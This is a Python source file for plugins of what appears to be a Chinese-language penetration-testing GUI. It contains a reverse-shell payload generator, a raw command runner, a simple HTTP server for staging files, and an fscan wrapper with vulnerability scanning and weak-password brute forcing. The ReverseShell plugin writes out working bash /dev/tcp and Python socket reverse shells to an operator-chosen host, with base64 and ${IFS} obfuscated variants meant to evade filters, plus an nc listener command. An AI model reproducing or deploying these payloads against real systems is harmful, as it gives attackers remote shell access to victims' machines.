import http.server
import socketserver
import threading
from tkinter import ttk

# 载荷生成
class ReverseShell(Plugin):
    menu="载荷生成"
    name="反弹Shell"
    type="laboratory"
    def buildWindow(self):
        tab_laboratory = self.frame_args["tab_laboratory"]
        frame_horizontal = tk.Frame(tab_laboratory)
        frame_horizontal.grid(row=0, column=0, padx=5, pady=10, sticky=tk.W)
        host_label = tk.Label(frame_horizontal, text="反弹IP:")
        host_label.grid(row=0, column=nexti(i=0))
        host_entry = tk.Entry(frame_horizontal, width=20)
        host_entry.grid(row=0, column=nexti())
        port_label = tk.Label(frame_horizontal, text="端口:")
        port_label.grid(row=0, column=nexti())
        port_entry = tk.Entry(frame_horizontal, width=8)
        port_entry.grid(row=0, column=nexti())
        tk.Label(frame_horizontal, width=5).grid(row=0, column=nexti(), padx=5)  #占位
        button_start = tk.Button(frame_horizontal, text="生成", command=self.onStart)
        button_start.grid(row=0, column=nexti(), padx=5)
        tk.Label(frame_horizontal, width=5).grid(row=0, column=nexti(), padx=5)  #占位
        button_stop = tk.Button(frame_horizontal, text="查看帮助文档", command=self.showHelp)
        button_stop.grid(row=0, column=nexti(), padx=5)

        frame_vertical = tk.Frame(tab_laboratory)
        frame_vertical.grid(row=1, column=0, pady=10, sticky=tk.NSEW)
        self.output_text = tk.Text(frame_vertical)
        self.output_text.pack(expand=1, fill="both")

        # 设置网格布局列和行权重
        tab_laboratory.grid_columnconfigure(0, weight=1)
        tab_laboratory.grid_rowconfigure(1, weight=1)
        
        # 设置options
        self.options=Options()
        dic={"Name":"IP", "Current Setting":"", "Required":"yes", "Description":"回连IP", "obj":host_entry }
        self.options.append(dic)
        dic={"Name":"PORT", "Current Setting":"", "Required":"yes", "Description":"回连端口", "obj":port_entry }
        self.options.append(dic)
        return self.output_text
        
    def onStart(self, event=None):
        options=self.getOptions()
        IP=options["IP"]
        PORT=int(options["PORT"])
        
        result =f"[+] 在回连服务器{IP}上执行监听命令\n"
        result+=f"nc -lvp {PORT}"+"\n\n"
        result+=f"[+] 生成针对{IP}:{PORT}的反弹Shell载荷\n"
        result+="Bash反弹:\n"
        payload=f"bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"
        result+=payload+"\n"
        b64payload=base64.b64encode(payload.encode("utf-8")).decode("utf-8")
        result+=f"echo {b64payload}|base64 -d|bash"+"\n"
        result+='bash${IFS}-c${IFS}"{echo,'+b64payload+'}|{base64,-d}|{bash,-i}"'
        result+="\n\n"
        result+="Python反弹:\n"
        payload=r'''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'''+IP+'",'+str(PORT)+'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'+"'"
        result+=payload
        result+="\n\n"
        self.log(result)
        
    def showHelp(self, event=None):
        super().showHelp()

class CMD(Plugin):
    menu="实验室"
    name="命令行"
    type="laboratory"
    def buildWindow(self):
        tab_laboratory = self.frame_args["tab_laboratory"]
        frame_horizontal = tk.Frame(tab_laboratory)
        frame_horizontal.grid(row=0, column=0, padx=5, pady=10, sticky=tk.W)
        cmd_label = tk.Label(frame_horizontal, text="CMD:")
        cmd_label.grid(row=0, column=nexti(i=0))
        cmd_entry = tk.Entry(frame_horizontal, width=100)
        cmd_entry.grid(row=0, column=nexti())
        tk.Label(frame_horizontal, width=5).grid(row=0, column=nexti(), padx=5)  #占位
        button_start = tk.Button(frame_horizontal, text="执行", command=self.onStart)
        button_start.grid(row=0, column=nexti(), padx=5)
        button_stop = tk.Button(frame_horizontal, text="停止", command=self.onStop)
        button_stop.grid(row=0, column=nexti(), padx=5)
        tk.Label(frame_horizontal, width=5).grid(row=0, column=nexti(), padx=5)  #占位
        button_stop = tk.Button(frame_horizontal, text="查看帮助文档", command=self.showHelp)
        button_stop.grid(row=0, column=nexti(), padx=5)

        frame_vertical = tk.Frame(tab_laboratory)
        frame_vertical.grid(row=1, column=0, pady=10, sticky=tk.NSEW)
        self.output_text = tk.Text(frame_vertical)
        self.output_text.pack(expand=1, fill="both")
        
        # 绑定回车事件
        cmd_entry.bind('<Return>', self.onStart)

        # 设置网格布局列和行权重
        tab_laboratory.grid_columnconfigure(0, weight=1)
        tab_laboratory.grid_rowconfigure(1, weight=1)
        
        # 设置options
        self.options=Options()
        dic={"Name":"CMD", "Current Setting":"", "Required":"yes", "Description":"执行的命令", "obj":cmd_entry }
        self.options.append(dic)
        return self.output_text
        
    def onStart(self, event=None):
        options=self.getOptions()
        cmd=options["CMD"]
        
        self.log(f"[+] {cmd}\n")
        self.executeCommand(cmd, logfunc=self.log)
        # TODO：添加自定义命令，并使自定义命令和系统命令都支持管道

    def onStop(self, event=None):
        self.log("[*] onStop\n")
            
    def showHelp(self, event=None):
        super().showHelp()
        help="功能上相当于system(CMD)\n\n"\
             "Windows下常用命令：\n"\
             "netstat -ano | findstr LISTEN\t\t\t查看监听端口\n"\
             "\n"
        self.log(help)
        
class WorkflowOrchestration(Plugin):
    menu="实验室"
    name="场景编排demo"
    type="text"
    def run(self, text):
        tasks=[]
        tasks+=[RemoveDuplicates]
        tasks+=[ToLower]
        tasks+=[SortLines]
        
        for _ in tasks:
            text=_().run(text)
        
        return text
    
class HttpServer(Plugin):
    menu="实验室"
    name="http.server"
    type="laboratory"
    server=None
    def buildWindow(self):
        tab_laboratory = self.frame_args["tab_laboratory"]
        frame_horizontal = tk.Frame(tab_laboratory)
        frame_horizontal.grid(row=0, column=0, padx=5, pady=10, sticky=tk.W)
        bind_label = tk.Label(frame_horizontal, text="bind:")
        bind_label.grid(row=0, column=nexti(i=0))
        ip_entry = tk.Entry(frame_horizontal, width=16)
        ip_entry.insert(0, "0.0.0.0")
        ip_entry.grid(row=0, column=nexti())
        tk.Label(frame_horizontal, width=1).grid(row=0, column=nexti(), padx=2)  #占位
        port_entry = tk.Entry(frame_horizontal, width=6)
        port_entry.insert(0, "5000")
        port_entry.grid(row=0, column=nexti())
        tk.Label(frame_horizontal, width=5).grid(row=0, column=nexti(), padx=5)  #占位
        button_start = tk.Button(frame_horizontal, text="开始", command=self.onStart)
        button_start.grid(row=0, column=nexti(), padx=5)
        button_stop = tk.Button(frame_horizontal, text="停止", command=self.onStop)
        button_stop.grid(row=0, column=nexti(), padx=5)
        tk.Label(frame_horizontal, width=5).grid(row=0, column=nexti(), padx=5)  #占位
        button_stop = tk.Button(frame_horizontal, text="查看帮助文档", command=self.showHelp)
        button_stop.grid(row=0, column=nexti(), padx=5)

        frame_vertical = tk.Frame(tab_laboratory)
        frame_vertical.grid(row=1, column=0, pady=10, sticky=tk.NSEW)
        self.output_text = tk.Text(frame_vertical)
        self.output_text.pack(expand=1, fill="both")

        # 设置网格布局列和行权重
        tab_laboratory.grid_columnconfigure(0, weight=1)
        tab_laboratory.grid_rowconfigure(1, weight=1)
        
        # 设置options
        self.options=Options()
        dic={"Name":"IP", "Current Setting":"", "Required":"yes", "Description":"监听网卡的IP", "obj":ip_entry }
        self.options.append(dic)
        dic={"Name":"PORT", "Current Setting":"", "Required":"yes", "Description":"监听端口", "obj":port_entry }
        self.options.append(dic)
        
        #MyHandler里会用
        PluginGlobalStorage[self.__class__.__name__]={"class_obj":self}
        return self.output_text
        
    def onStart(self, event=None):
        options=self.getOptions()
        IP=options["IP"]
        PORT=int(options["PORT"])
        
        class MyHandler(http.server.SimpleHTTPRequestHandler):
            def log_message(self, format, *args):
                msg=format%args
                obj=PluginGlobalStorage["HttpServer"]["class_obj"]
                obj.log(msg+"\n")
                
        def fn():
            with socketserver.TCPServer((IP, PORT), MyHandler) as self.server:
                self.log(f"监听于{IP}:{PORT}\n")
                self.server.serve_forever()
                
        self.log("[+] 启动Server\n")
        thread = threading.Thread(target=fn)
        thread.start()

    def onStop(self, event=None):
        if self.server:
            self.log("[+] 关闭Server\n")
            self.server.shutdown()
            self.server=None
        else:
            self.log("[*] Server未启动\n")
            
    def showHelp(self, event=None):
        super().showHelp()
        self.log("相当于在python3下调用：\n")
        self.log("python -m http.server port\n\n")
        self.log("或者相当于在python2.7下调用：\n")
        self.log("python -m SimpleHTTPServer port\n\n")
        
class Fscan(Plugin):
    menu="实验室"
    name="fscan扫描"
    type="laboratory"
    def __init__(self):
        Plugin.__init__(self)
        self.bin_dir=os.getcwd()+"/"+self.plugin_directory+"/tool/fscan/"
        #print("fscan.bin_dir: "+self.bin_dir)
        self.fscan="fscan32.exe"
        self.strategy_options=["ICMP存活探测", "TCP常见端口扫描", "默认扫描（带漏洞扫描与弱口令爆破）", "扫常见漏洞但不爆破密码"]
        self.bisrunning=False
        
    def buildWindow(self):
        tab_laboratory = self.frame_args["tab_laboratory"]
        frame_horizontal = tk.Frame(tab_laboratory)
        frame_horizontal.grid(row=0, column=0, padx=5, pady=10, sticky=tk.W)
        target_label = tk.Label(frame_horizontal, text="  目标：")
        target_label.grid(row=0, column=nexti(i=0))
        self.target_entry = tk.Entry(frame_horizontal, width=30)
        self.target_entry.grid(row=0, column=nexti())
        tk.Label(frame_horizontal, width=5).grid(row=0, column=nexti(), padx=2)  #占位
        strategy_label = tk.Label(frame_horizontal, text="策略：")
        strategy_label.grid(row=0, column=nexti())
        self.strategy_box = ttk.Combobox(frame_horizontal, values=self.strategy_options, state="readonly")
        self.strategy_box.set(self.strategy_options[1])  #设置默认选项
        self.strategy_box.grid(row=0, column=nexti())
        tk.Label(frame_horizontal, width=5).grid(row=0, column=nexti(), padx=5)  #占位
        button_start = tk.Button(frame_horizontal, text="开始扫描", command=self.onStart)
        button_start.grid(row=0, column=nexti(), padx=5)
        button_stop = tk.Button(frame_horizontal, text="停止", command=self.onStop)
        button_stop.grid(row=0, column=nexti(), padx=5)
        tk.Label(frame_horizontal, width=5).grid(row=0, column=nexti(), padx=5)  #占位
        button_stop = tk.Button(frame_horizontal, text="查看帮助文档", command=self.showHelp)
        button_stop.grid(row=0, column=nexti(), padx=5)
        
        frame_horizontal2 = tk.Frame(tab_laboratory)
        frame_horizontal2.grid(row=1, column=0, padx=5, pady=10, sticky=tk.W)
        cmd_label = tk.Label(frame_horizontal2, text="命令行：")
        cmd_label.grid(row=1, column=nexti(i=0))
        self.cmd_entry = tk.Entry(frame_horizontal2, width=30000)
        self.cmd_entry.grid(row=1, column=nexti())

        frame_vertical = tk.Frame(tab_laboratory)
        frame_vertical.grid(row=2, column=0, pady=10, sticky=tk.NSEW)
        self.output_text = tk.Text(frame_vertical)
        self.output_text.pack(expand=1, fill="both")
        
        #绑定按键释放事件
        self.target_entry.bind('<KeyRelease>', self.onTargetEntryKeyRelease)
        
        # 绑定下拉框选择事件
        self.strategy_box.bind("<<ComboboxSelected>>", self.onComboboxSelected)
        
        # 绑定回车事件
        self.cmd_entry.bind('<Return>', self.onStart)

        # 设置网格布局列和行权重
        tab_laboratory.grid_columnconfigure(0, weight=1)
        tab_laboratory.grid_rowconfigure(2, weight=1)
        
        # 设置options
        self.options=Options()
        dic={"Name":"CMD", "Current Setting":"", "Required":"yes", "Description":"执行的命令", "obj":self.cmd_entry }
        self.options.append(dic)
        return self.output_text
        
    def setCMD(self, target, strategy):
        text=""
        if "ICMP存活探测"==strategy:
            text="{fscan} -h {target} -pn 0-65535 -no".format(fscan=self.fscan, target=target)
        elif "TCP常见端口扫描"==strategy:
            text="{fscan} -h {target} -pa 3389 -nobr -nopoc -no".format(fscan=self.fscan, target=target)
        elif "默认扫描（带漏洞扫描与弱口令爆破）"==strategy:
            text="{fscan} -h {target} -no".format(fscan=self.fscan, target=target)
        elif "扫常见漏洞但不爆破密码"==strategy:
            text="{fscan} -h {target} -nobr -no".format(fscan=self.fscan, target=target)
        self.cmd_entry.delete(0, tk.END)  # 清除现有内容
        self.cmd_entry.insert(0, text)
        
    def onTargetEntryKeyRelease(self, event=None):
        self.setCMD(self.target_entry.get(), self.strategy_box.get())
        
    def onComboboxSelected(self, event=None):
        self.setCMD(self.target_entry.get(), self.strategy_box.get())
        
    def onStart(self, event=None):
        options=self.getOptions()
        cmd=options["CMD"]
        
        if self.bisrunning:
            self.log("[!] fscan正在运行中，请等待任务完成或者终止任务。\n")
            return
        
        self.bisrunning=True
        def fn():
            try:
                self.executeCommand(cmd, cwd=self.bin_dir, logfunc=self.log)
            except Exception as e:
                print(e)
            self.bisrunning=False
            
        self.log(f"[+] {cmd}\n")
        self.thread = threading.Thread(target=fn)
        self.thread.start()

    def onStop(self, event=None):
        self.log("[*] onStop\n")
        #self.thread._stop()  #无效
        
    def showHelp(self, event=None):
        super().showHelp()
        help ='点击“开始扫描”会执行“命令行”里的内容，“目标”与“策略”只是为了方便生成fscan命令行，如果直接在命令行里写普通命令也是可以执行的。\n\n'
        help+="fscan帮助文档：\n"
        self.log(help)
        self.executeCommand(self.fscan+" --help", cwd=self.bin_dir, logfunc=self.log)
        self.log("\n")
        